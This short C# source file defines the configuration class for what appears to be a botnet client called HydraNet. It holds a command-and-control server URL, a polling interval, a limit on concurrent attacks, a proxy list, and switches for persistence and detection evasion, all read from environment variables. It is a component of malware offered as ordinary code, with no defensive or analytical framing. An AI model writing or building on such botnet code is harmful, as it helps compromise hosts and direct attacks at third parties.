namespace HydraNet.Config;

public sealed class BotConfig
{
    public required string C2Url { get; init; }
    public TimeSpan PollInterval { get; init; } = TimeSpan.FromSeconds(30);
    public int MaxConcurrentAttacks { get; init; } = 3;
    public bool EnablePersistence { get; init; } = false;
    public bool EnableEvasion { get; init; } = true;
    public string ProxyListPath { get; init; } = "proxies.txt";

    public static BotConfig LoadFromEnvironment()
    {
        return new BotConfig
        {
            C2Url = Environment.GetEnvironmentVariable("HYDRA_C2") ?? "http://127.0.0.1:8080",
            PollInterval = TimeSpan.FromSeconds(
                int.TryParse(Environment.GetEnvironmentVariable("HYDRA_POLL"), out var poll) ? poll : 30),
            MaxConcurrentAttacks =
                int.TryParse(Environment.GetEnvironmentVariable("HYDRA_MAX_ATTACKS"), out var max) ? max : 3,
            EnablePersistence = Environment.GetEnvironmentVariable("HYDRA_PERSIST") == "1",
            EnableEvasion = Environment.GetEnvironmentVariable("HYDRA_EVASION") != "0"
        };
    }
}
